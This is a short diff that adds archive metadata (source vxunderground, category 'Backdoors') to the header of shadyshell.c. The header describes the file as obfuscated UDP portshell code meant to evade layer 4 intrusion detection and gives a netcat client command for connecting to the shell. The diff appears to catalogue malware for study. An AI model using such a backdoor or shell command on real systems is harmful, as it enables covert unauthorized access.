@@ -1,3 +1,14 @@
+/*
+  name      Backdoors
+  type      linux
+  cve       —
+  year      unknown
+  os        Linux
+  authors   unknown
+  source    vxunderground
+  archived  vxunderground, krisyotam (2026)
+  notes     —
+ */
 /* shadyshell.c by Derek Callaway <super@udel.edu> -- S@IRC
    obfuscated/optimized/compact UDP portshell code; Avoid layer 4 IDS ;-)
    Example client usage: nc -u host.dom 1337
